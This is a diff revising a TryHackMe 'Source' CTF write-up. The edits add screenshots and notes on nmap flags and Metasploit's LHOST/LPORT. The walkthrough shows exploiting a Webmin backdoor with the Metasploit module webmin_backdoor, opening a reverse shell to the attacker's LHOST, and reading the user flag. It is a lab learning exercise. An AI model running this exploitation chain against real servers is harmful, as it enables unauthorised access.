@@ -1,8 +1,7 @@
-# TryHackMe — Source
+# TryHackMe - Source
 
 **Platform:** TryHackMe  
 **Room:** Source  
-**Difficulty:** Easy  
 
 ---
 
@@ -21,6 +20,11 @@ Start with a network scan to enumerate open ports on the target:
 ```bash
 nmap -sV -sC <TARGET_IP>
 ```
+![nmap1](Images/nmap1.png)
+![nmap2](Images/nmap2.png)
+
+> **Note:** -sV: Probes open ports to identify the software name and version running on them (e.g., Apache httpd 2.4.41).
+-sC: Executes the default set of scripts from the Nmap Scripting Engine (NSE) to identify vulnerabilities, enumerate services, or check configuration issues.
 
 **Results:**
 
@@ -42,10 +46,13 @@ Navigate to the target on port 10000 in the browser:
 ```
 https://<TARGET_IP>:10000
 ```
+![browser](Images/browser.png)
 
 Accept the SSL certificate warning — you'll be greeted with a **Webmin login page**.
 
 Attempting common credentials (`admin`, `root`, `user`, etc.) yields no access. Time to look for a known vulnerability.
+
+![browser2](Images/browser2.png)
 
 ---
 
@@ -71,14 +78,14 @@ Launch Metasploit:
 ```bash
 msfconsole
 ```
+![metasploit1](Images/metasploit1.png)
 
 Search for the relevant exploit:
 
 ```bash
 search webmin backdoor
 ```
-
-Or we can refer to the github for the link to the exploit.
+Or we can refer to the reference module on github for the link to the exploit.
 
 Select and configure the module:
 
@@ -86,6 +93,8 @@ Select and configure the module:
 use exploit/linux/http/webmin_backdoor
 show options
 ```
+![metasploitoptions1](Images/metasploitoptions1.png)
+![metasploitoptions2](Images/metasploitoptions2.png)
 
 ### Setting Required Options
 
@@ -95,6 +104,12 @@ set RHOSTS <TARGET_IP>
 set LHOST <YOUR_IP>
 run
 ```
+![metasploitrun](Images/metasploitrun.png)
+
+
+> **Note:** In Metasploit, the LHOST and LPORT are variables used within the Metasploit Framework and msfvenom payload generation, to establish a "reverse shell" connection from a target machine back to an attacker's machine.
+- LHOST (Local Host): The IP address or domain of the attacker's machine that the victim's computer will connect back to.
+- LPORT (Local Port): The port number on the attacker's machine that the victim's computer will connect to.
 
 ### Getting a Shell
 
@@ -110,6 +125,7 @@ Drop into a native shell:
 ```bash
 shell
 ```
+![metasploitshell](Images/metasploitshell.png)
 
 > **Note:** In Metasploit, the `shell` command is used within a Meterpreter session to access the OS's native command-line interface — `/bin/sh` on Linux or `cmd.exe` on Windows. It gives direct, unrestricted access to the target system.
 
@@ -135,6 +151,7 @@ ls /home/
 ```bash
 cat /home/dark/user.txt
 ```
+And that's it!
 
 ---
 
@@ -153,10 +170,10 @@ cat /home/dark/user.txt
 
 ## Tools Used
 
-- `nmap` — Port and service enumeration
-- `Metasploit Framework` — Exploitation (`exploit/linux/http/webmin_backdoor`)
-- Browser — Webmin web interface
-- AttackerKB — Vulnerability research
+- `nmap` - Port and service enumeration
+- `Metasploit Framework` - Exploitation (`exploit/linux/http/webmin_backdoor`)
+- Browser - Webmin web interface
+- AttackerKB - Vulnerability research
 
 ---
 
